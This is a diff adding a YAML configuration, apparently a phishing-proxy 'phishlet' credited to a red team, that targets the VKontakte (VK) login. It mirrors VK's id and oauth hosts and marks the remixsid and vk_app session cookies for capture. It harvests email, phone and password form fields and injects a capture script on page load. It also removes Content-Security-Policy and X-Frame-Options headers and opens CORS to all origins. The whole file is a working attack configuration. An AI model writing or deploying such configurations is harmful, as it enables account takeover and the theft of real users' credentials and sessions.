@@ -1,0 +1,39 @@
+name: "VKontakte (VK)"
+author: "Vanta v5 Red Team"
+min_ver: "5.0.0"
+proxy_hosts:
+  - subdomain: "id"
+    target: "id.vk.com"
+  - subdomain: "oauth"
+    target: "oauth.vk.com"
+auth_urls: 
+  - "/"
+  - "/auth"
+landing_path: ["/"]
+auth_tokens:
+  - {type: "cookie", name: "remixsid"}
+  - {type: "cookie", name: "remixlang"}
+  - {type: "cookie", name: "vk_app"}
+credentials:
+  - {type: "post_param", name: "email", regex: "^[^@]+@[^@]+\\.[^@]+$"}
+  - {type: "post_param", name: "phone", regex: "^\\+[0-9]{1,15}$"}
+  - {type: "post_param", name: "password", regex: null}
+injections:
+  - {type: "js", path: "/core/assets/js/capture.js", trigger: "load"}
+headers:
+  - {action: "remove", name: "Content-Security-Policy"}
+  - {action: "remove", name: "X-Frame-Options"}
+  - {action: "remove", name: "X-Content-Type-Options"}
+path_rewrites:
+  - {pattern: "^/$", replace: "/", methods: ["GET"]}
+cookie_rewrites: []
+blocklist:
+  - {pattern: "vk.com/analytics|/tracker/|/ads/", mimes: ["text/javascript"], max_kb: 512}
+form_actions:
+  - {selector: "form[action*='login']", action_to: "/login"}
+bridges:
+  - {prefix: "/method/", target_host: "api.vk.com", strip_prefix: true, cors: "allow_all"}
+cors:
+  mode: "allow_all"
+  methods: ["GET", "POST", "OPTIONS"]
+  headers: ["*"]
